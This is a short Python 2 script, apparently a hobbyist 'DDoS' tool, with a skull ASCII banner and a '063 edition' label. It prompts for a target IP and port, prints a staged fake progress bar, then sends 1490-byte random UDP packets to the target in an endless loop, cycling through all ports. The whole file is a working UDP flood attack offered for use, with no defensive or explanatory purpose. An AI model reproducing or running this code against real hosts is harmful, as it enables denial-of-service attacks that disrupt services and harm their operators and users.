import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print
print '''
   v$$$$$ul.                       '>u$$$$$v     
   #$$$$$$$B}.                    ^f$$$$$$$$I     
   l$$$$$$$$$B>                 ./$$$$$$$$$%.     
    *$$$$$$$$$$j.              "%$$$$$$$$$$I      
    `B$$$$$$$$$$c.            ,$$$$$$$$$$$|       
     `8$$$$$$$$$$n           `B$$$$$$$$$$/        
      .r$$$$$$$$$$-          u$$$$$$$$$$-         
        ,z$$$$$$$$@' ..  .. ^$$$$$$$$$x`          
          "f$$$$$$$M&$$B%$$8M$$$$$$$f^            
            ;$$$$$$$$$$$$$$$$$$$$$$`              
            "$$$$$$$$$$$$$$$$$$$$$$`              
           .&$$$$$$$$$$$$$$$$$$$$$$8'             
           -$$$$$%W%$$$$$$$$%%B$$$$$|             
          .8%$$$$$$$$$$$$$$$$$$$$$$$@.            
          1$8\ %$$$$$$$$$$$$$$$$$* /$(            
         ,$$$%     t$$$$$$$$n,    z$$$:           
         n$$$$%v%$8\ $$$$$$]/ $@nW$$$$r           
         ;$$$$$$$@$%\$$$$$$/M$@@$$$$$$"           
          ,W$$$$$$$$$$$88$$$$$$$$$$$M}            
               MW&&WM&8$$%&8%8WWM          
                $$$$$$$$$$$$$$$$      
                  M$$$$$$$$$$8        
                   1*#$$$$&#rl
  '''
print ("                   063 edition                ")
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet 069")
print "progress 0% "
time.sleep(4)
print "progress 25%"
time.sleep(4)
print "progress 50%"
time.sleep(4)
print "progress 75%"
time.sleep(4)
print "progress 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s data to %s target port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

